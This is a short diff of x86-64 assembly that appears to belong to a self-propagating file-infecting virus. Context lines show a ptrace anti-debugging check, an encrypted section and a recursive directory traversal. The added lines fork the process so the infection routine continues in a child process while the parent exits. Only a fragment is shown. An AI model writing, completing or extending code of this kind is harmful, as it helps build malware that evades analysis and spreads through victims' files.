@@ -50,6 +50,14 @@ encrypted_start:
     syscall             ; ptrace(PTRACE_TRACEME, 0, 1, 0);
     cmp rax, 0
     jl exit
+birth_of_child:
+    mov rax, SYS_FORK
+    syscall
+    mov [rsp + fork], rax
+    cmp rax, 0
+    jnz exit
+
+
     lea rdi, [rsp + fileName]
     lea rsi, [rel firstDir]
     call ft_strcpy
@@ -62,11 +70,15 @@ encrypted_start:
     call recursive
 
 exit:
+    xor rax, rax
     pop rsi
     pop rdi
     pop rcx
     pop rdx
     leave
+
+    cmp qword [rsp + fork], 0 
+    jz death_of_child
 
 jump:
     ret
@@ -75,6 +87,8 @@ jump:
     nop
     nop
 
+death_of_child:
+    ret
 
 %include "recursive.s"
 
